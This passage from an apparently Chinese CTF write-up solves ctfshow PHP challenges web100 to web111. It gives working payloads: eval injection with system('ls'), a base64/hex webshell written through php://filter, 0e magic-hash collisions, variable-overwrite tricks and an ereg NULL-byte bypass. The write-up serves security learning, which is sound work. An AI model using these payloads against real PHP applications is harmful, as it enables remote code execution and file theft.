punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v2不能有;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v3必须有;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>运算符优先级：**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p><p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。</p><p>是数字和数字字符串则返回 TRUE，否则返回 FALSE</p><p><strong>var_dump()<strong>函数可以输出多个值。</strong>print_r</strong>也可以</p><p><strong>&#x3D;<strong>的运算符比</strong>and</strong>高</p><p>对于v0的值只需要看v1就可以v2,v3是干扰</p><p>所以v1输入数字</p><p>Payload:</p><blockquote><p>?v1&#x3D;11&amp;v2&#x3D;var_dump($ctfshow)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><p>?v1&#x3D;1&amp;v2&#x3D;system(‘ls’)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p></blockquote><p>最后flag<code>0x2d</code>要转化为<code>-</code></p><h4 id="web101-反射类"><a href="#web101-反射类" class="headerlink" title="web101(反射类)"></a>web101(反射类)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>涉及到类，可以考虑使用 ReflectionClass 建立反射类。</p><p>new ReflectionClass($class) 可以获得类的反射对象（包含元数据信息）。</p><p>元数据对象（包含class的所有属性&#x2F;方法的元数据信息）。</p><p>payload：v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p><p>flag中有些字符经过ACSII码变换，好像还少了一位，爆破即可</p><h4 id="web102-substr-call-user-func"><a href="#web102-substr-call-user-func" class="headerlink" title="web102(substr call_user_func)"></a>web102(substr call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 截去了前两个字符</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>**substr() **:函数返回字符串的一部分</p><p>**call_user_func()**：把第一个参数作为回调函数使用，后面的参数是这个函数的参数。返回调用函数的返回值。其实就是一种特殊的调用函数的方式。</p><p><strong>php5</strong>下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，但题目环境没配好，是<strong>php7</strong>,所以要另换方法。<br>用伪协议写入，所以需要base64编码后转成16进制全是数字的字符串</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?=`cat *`;'</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$a=PD89YGNhdCAqYDs=</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PD89YGNhdCAqYDs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> 得到5044383959474e6864434171594473</code></pre><p><strong>PHP短标签</strong></p><?=(表达式)?><p>等价于<?php echo (表达式)?></p><p>Payload:</p><blockquote><p>GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p><p>POST:v1&#x3D;hex2bin</p></blockquote><h4 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>加了个鸡肋的限制，因为本来就是用base64加密后的，所以没什么影响</p><h4 id="web104-md5-sha1"><a href="#web104-md5-sha1" class="headerlink" title="web104(md5 sha1)"></a>web104(md5 sha1)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>shal函数就是计算散列函数，可以理解为一个不可逆的加密函数，这题没啥过滤，直接传两个相同的参数就好了，构造payload</p><p>或者使用数组也可以绕过</p><p>值的判断是使用 <code>==</code>，所以找加密后 0e 开头的两个值也可以。</p><blockquote><p>aaK1STfY -&gt; 0e76658526655756207688271159624026011393</p><p>aaO8zKZF -&gt; 0e89257456677279068558073954252716165668</p></blockquote><p>以下这些字符串，md5哈希之后都是0e开头的：</p><blockquote><p>s878926199a -&gt; 0e545993274517709034328855841020</p><p>s155964671a -&gt; 0e342768416822451524974117254469</p><p>s214587387a -&gt; 0e848240448830537924465865611904 </p><p>s214587387a -&gt; 0e848240448830537924465865611904 </p><p>QLTHNDT -&gt; 0e405967825401955372549139051580 </p><p>QNKCDZO -&gt; 0e830400451993494058024219903391 </p><p>EEIZDOI -&gt; 0e782601363539291779881938479162 </p><p>240610708 -&gt; 0e462097431906509019562988736854 </p><p>4011627063 -&gt; 0e485805687034439905938362701775 </p><p>4775635065 -&gt; 0e998212089946640967599450361168 </p><p>4790555361 -&gt; 0e643442214660994430134492464512 </p><p>5432453531 -&gt; 0e512318699085881630861890526097 </p><p>5579679820 -&gt; 0e877622011730221803461740184915 </p><p>5585393579 -&gt; 0e664357355382305805992765337023 </p><p>6376552501 -&gt; 0e165886706997482187870215578015 </p><p>7124129977 -&gt; 0e500007361044747804682122060876 </p><p>7197546197 -&gt; 0e915188576072469101457315675502 </p><p>7656486157 -&gt; 0e451569119711843337267091732412</p></blockquote><h4 id="web105-php变量覆盖"><a href="#web105-php变量覆盖" class="headerlink" title="web105(php变量覆盖)"></a>web105(php变量覆盖)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'你还想要flag嘛？'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><ul><li><p>本题考查变量覆盖和<code>die()</code>的知识</p></li><li><p><code>$$a = $$b</code>可以类似于，将$a的地址指向$b</p><p>所以无论$b怎么改变值，$a的值都会和$b一样</p></li><li><p><code>die()</code>函数虽然会终止程序，但同时也会输出括号内的终止提示信息</p></li><li><p>本题利用变量覆盖和<code>die()</code>函数的特性</p><ol><li>先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces&#x3D;flag，此时suces&#x3D;&gt;flag的地址</li><li>再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error&#x3D;suces，此时error&#x3D;&gt;flag的地址</li><li>此时无论进入哪个<code>die()</code>函数，都可以输出<code>$flag</code>的值</li></ol></li></ul><p>Payload:</p><blockquote><p>GET:?suces&#x3D;flag</p><p>POST:error&#x3D;suces</p></blockquote><h4 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>加了限制，Payload同104</p><h4 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107(parse_str)"></a>web107(parse_str)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><strong>parse_str</strong>($v1,$v2); &#x2F;&#x2F;把v1的值相应的换成键值对再存入v2(数组)<br>v1&#x3D;flag&#x3D;114&amp;index&#x3D;300的话，<br>v2就变成一个数组，内容为flag–&gt;114      index–&gt;300（分为这两个键值对）</p><p>所以只需要让传入的flag md5值与v3一样就可</p><p>Payload:</p><blockquote><p>POST:v1&#x3D;flag&#x3D;47bce5c74f589f4867dbd57e9ca9f808</p><p>GET:?v3&#x3D;aaa</p></blockquote><h4 id="we108-ereg-NULL截断漏洞"><a href="#we108-ereg-NULL截断漏洞" class="headerlink" title="we108(ereg NULL截断漏洞)"></a>we108(ereg NULL截断漏洞)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//只有36d的人才能看到flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>ereg (“^[a-zA-Z]+$”, $_GET[‘c’])&#x3D;&#x3D;&#x3D;FALSE</p><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。</p><p>结合ereg()函数用法，搜索不到指定字符串就会返回FALSE</p><p>所以要让c中有字母，但不能出现其他东西</p><p>ereg 函数存在 NULL 截断漏洞，可以绕过正则过滤，使用 %00 截断。</p><p>0x36d，转十进制是877。</p><p>Payload:<code>c=a%00778</code></p><h4 id="web109-php内置类的使用"><a href="#web109-php内置类的使用" class="headerlink" title="web109(php内置类的使用)"></a>web109(php内置类的使用)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>看到echo new尝试反射类</p><p>Payload：</p><blockquote><p>?v1&#x3D;Reflectionclass&amp;v2&#x3D;system(‘tac fl36dg.txt’)</p><p>?v1&#x3D;Exception&amp;v2&#x3D;system(‘cat *’)  异常处理</p><p>?v1&#x3D;class{ public function __construct(){ system(‘ls’); } };&amp;v2&#x3D;a  用匿名类绕过 </p></blockquote><p>v1&#x3D;内置类&amp;v2&#x3D;system(‘ls’)即可 php中会先执行ls命令然后把结果作为参数再执行但ls的结果已经被输出了</p><h4 id="web110-FilesystemIterator-class"><a href="#web110-FilesystemIterator-class" class="headerlink" title="web110(FilesystemIterator class)"></a>web110(FilesystemIterator class)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>[The FilesystemIterator class](<a href="https://www.php.net/manual/zh/class.filesystemiterator.php">PHP: FilesystemIterator - Manual</a>)</p><p>php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</p><p>Payload:<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h4 id="web111-GLOBALS"><a href="#web111-GLOBALS" class="headerlink" title="web111(GLOBALS)"></a>web111(GLOBALS)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token 